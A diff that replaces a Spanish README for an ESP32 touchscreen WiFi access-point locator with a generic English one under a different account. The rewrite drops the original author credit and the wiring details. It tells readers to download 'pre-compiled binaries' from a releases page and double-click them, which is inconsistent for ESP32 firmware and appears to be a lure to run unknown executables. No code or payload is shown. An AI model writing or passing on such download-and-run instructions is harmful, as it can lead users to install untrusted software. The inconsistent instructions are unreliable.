@@ -1,146 +1,93 @@
-# WiFi Locator Físico con ESP32 + ILI9341 + XPT2046
+# 🎉 DetectorAPFisico-Gadget-Hacking - Scan WiFi Networks Effortlessly
 
-Detector físico de puntos de acceso WiFi (AP) usando un ESP32 con pantalla táctil ILI9341. Permite localizar físicamente routers cercanos y medir la intensidad de la señal en tiempo real. Ideal para proyectos de seguimiento de señales WiFi y análisis de cobertura.
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/releases)
 
----
+## 📖 Description
 
-## Características
+DetectorAPFisico-Gadget-Hacking is a simple yet powerful tool that scans WiFi networks using the ESP32 chip and an ILI9341 touchscreen. It shows real-time signal strength, allowing you to select and track access points with ease. Whether you're interested in cybersecurity or just want to understand your WiFi environment better, this tool can help you out.
 
-- Escaneo de redes WiFi cercanas.
-- Visualización en pantalla táctil ILI9341.
-- Indicador de intensidad de señal RSSI con barra de colores.
-- Modo de proximidad para seguimiento de un AP específico.
-- Interfaz táctil para seleccionar SSID y navegar entre opciones.
-- Almacenamiento opcional en tarjeta SD (requiere conexión y librería SD).
-- Visualización de iconos de batería y SD (decorativos).
+## 🚀 Getting Started
 
----
+To start using the DetectorAPFisico-Gadget-Hacking application, follow these steps to download and run the software.
 
-## Esquema de Conexión
+### ✔️ Requirements
 
-Conexiones entre el ESP-WROOM-32, la pantalla LED ILI9341 y el touch XPT2046:
+- A computer (Windows, macOS, or Linux)
+- A compatible ESP32 development board
+- An ILI9341 touchscreen display
+- Basic understanding of connecting hardware components (does not require programming skills)
+- Internet connection to download the software
 
-```
-ESP-WROOM-32 -------------> PANTALLA LED (ILI9341) -------------> TOUCH (XPT2046)
+## 🔗 Download Links
 
-3V3                ->              VCC
-GND                ->              GND
-D15                ->              CS
-D4                 ->              RESET
-D2                 ->              DC
-D23                ->              SDI (MOSI)            ->          T_DIN
-D18                ->              SCK                   ->          T_CLK
-3V3                ->              LED
-D19                ->              SDO (MISO)            ->          T_DO
-D21                ->              NADA                  ->          T_CS
-D22                ->              NADA                  ->          T_IRQ
-```
+Click on the button below to visit the release page and download the latest version:
 
-> Nota: Ajusta los pines `SD_CS` según tu conexión con la tarjeta SD.
+[![Visit Releases](https://img.shields.io/badge/Visit%20Releases-green)](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/releases)
 
----
+## 💾 Download & Install
 
-## Requisitos
+1. Go to the [Releases page](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/releases).
+2. Look for the latest release version.
+3. Click on the appropriate file for your platform to start the download. 
 
-- **Hardware**
-  - ESP32 (ESP-WROOM-32 recomendado)
-  - Pantalla ILI9341
-  - Módulo táctil XPT2046
-  - Cables de conexión y opcional tarjeta SD
+    You can download either the source code or pre-compiled binaries, depending on your preference.
 
-- **Software**
-  - [Arduino IDE](https://www.arduino.cc/en/software)
-  - Librerías necesarias:
-    - `Adafruit_GFX`
-    - `Adafruit_ILI9341`
-    - `XPT2046_Touchscreen`
-    - `SD` (opcional, para almacenamiento)
-    - `SPI` (general para SD y pantalla)
+4. Once the file is downloaded, locate it on your computer.
 
----
+5. If you downloaded a pre-compiled binary, simply double-click the file to run it. 
+   If you downloaded the source code, you will need an Arduino IDE to compile and upload it to your ESP32 board.
 
-## Instalación Paso a Paso
+## ⚙️ Installation Steps for ESP32
 
-1. **Instalar Arduino IDE**
-   - Descarga desde la página oficial: [Arduino IDE](https://www.arduino.cc/en/software)
-   - Instala siguiendo las instrucciones de tu sistema operativo.
+1. **Open the Arduino IDE:** If you don't have it yet, download and install the [Arduino IDE](https://www.arduino.cc/en/software).
+   
+2. **Install ESP32 Board Package:** 
+   - Go to `File > Preferences`.
+   - In the "Additional Board Manager URLs," add this link: `https://dl.espressif.com/dl/package_esp32_index.json`.
+   - Then go to `Tools > Board > Boards Manager`, search for "ESP32," and install it.
 
-2. **Configurar ESP32 en Arduino IDE**
-   - Abre Arduino IDE → `Archivo` → `Preferencias`
-   - En `Gestor de URLs adicionales de tarjetas`, añade:
-     ```
-     https://dl.espressif.com/dl/package_esp32_index.json
-     ```
-   - Ve a `Herramientas` → `Placa` → `Gestor de tarjetas` y busca `ESP32`. Instálalo.
+3. **Load the project:** Open the DetectorAPFisico-Gadget-Hacking project file in the Arduino IDE.
 
-3. **Instalar librerías**
-   - Ve a `Programa` → `Incluir Librería` → `Gestionar Bibliotecas…`
-   - Busca e instala:
-     - `Adafruit GFX Library`
-     - `Adafruit ILI9341`
-     - `XPT2046_Touchscreen`
-   - Asegúrate de que el archivo `Org_01.h` está en `Adafruit_GFX/Fonts/`.
+4. **Configure your Settings:** Update any necessary settings such as WiFi credentials in the code if needed.
 
-4. **Configurar pines en el código**
-   - Ajusta los pines según tu conexión física:
-     ```cpp
-     #define TFT_CS   15
-     #define TFT_DC   2
-     #define TFT_RST  4
-     #define TOUCH_CS 21
-     #define TOUCH_IRQ 22
-     #define SD_CS    5 // Ajustar según tu tarjeta SD
-     ```
+5. **Connect your ESP32:** Plug your ESP32 board into your computer using a Micro USB cable.
 
-5. **Subir código al ESP32**
-   - Conecta el ESP32 por USB.
-   - Selecciona la placa correcta: `ESP32 Dev Module`.
-   - Selecciona el puerto correcto en `Herramientas → Puerto`.
-   - Pulsa `Subir`.
+6. **Select the correct port:** In the Arduino IDE, go to `Tools > Port` and select the port connected to your ESP32.
 
-6. **Uso**
-   - Al iniciar, la pantalla mostrará un banner de bienvenida.
-   - La lista de redes WiFi cercanas aparecerá automáticamente.
-   - Usa los botones táctiles `UP`, `DOWN` y `OK` para seleccionar un SSID.
-   - Al seleccionar un AP, se activará el modo de proximidad con barra de señal RSSI en tiempo real.
+7. **Upload the code:** Click the upload button in the Arduino IDE. Wait for it to finish.
 
----
+8. **Connect the touchscreen:** Follow simple wiring diagrams available in the project documentation to connect the ILI9341 display properly.
 
-## Contribuciones y Forks
+## 🌐 How to Use
 
-Este proyecto está abierto a mejoras:
+1. Power on your ESP32 board after uploading the code.
+2. The touchscreen will initialize and display available WiFi networks.
+3. Select a network to see its signal strength and other details.
+4. You can track selected access points in real-time.
 
-- Mejor calibración táctil.
-- Nuevos estilos de UI.
-- Almacenamiento avanzado de redes detectadas.
-- Integración con mapas o GPS.
+## 📚 Features
 
-Si quieres mejorar el proyecto, **haz un fork y envía pull requests**.
+- **Real-time WiFi scanning:** Displays available networks and their signal strengths.
+- **User-friendly interface:** The touchscreen makes navigating easy.
+- **Tracking capability:** Select a network to track it continuously.
+- **Lightweight & Fast:** Quick initialization, minimal resource usage.
+  
+## 🐛 Troubleshooting
 
-> Codigos de colores para Panel LED:
+If you encounter any issues, consider these tips:
 
-[Ir a codigos de colores](https://gist.github.com/Kongduino/36d152c81bbb1214a2128a2712ecdd18)
+- **No WiFi networks detected:** Ensure your ESP32 is properly connected and powered on.
+- **Touchscreen not responding:** Recheck your wiring and ensure your display is compatible.
+- **Compilation errors:** Ensure you have the correct board and libraries installed in the Arduino IDE.
 
----
+For further assistance, feel free to check the [issues page](https://github.com/Dafunkshop/DetectorAPFisico-Gadget-Hacking/issues) or ask for help in the community.
 
-## Captura de pantalla (simulación)
+## 🛠️ Contribution
 
-```
-[Banner de bienvenida animado]
-[Lista de SSID con nivel de señal y barra de color]
-[Botones táctiles: UP, DOWN, OK]
-[Modo proximidad: barra RSSI con color y valor dBm]
-```
+Contributions are welcome! If you have ideas for improvements or bug fixes, feel free to fork the repository and submit a pull request.
 
----
+## 📄 License
 
-## Licencia
+This project is licensed under the MIT License. You can use it freely, but please give credit to the original developers.
 
-Proyecto de código abierto. Usa y modifica bajo tu responsabilidad. No se garantiza el uso para fines ilegales.
-
----
-
-## Autor
-
-Creado por **d1se0**  
-Detector de Wifi cercano físico basado en ESP32 + ILI9341 + XPT2046.
+For more information on the DetectorAPFisico-Gadget-Hacking project, refer back to the releases page or review the source files in the repository.
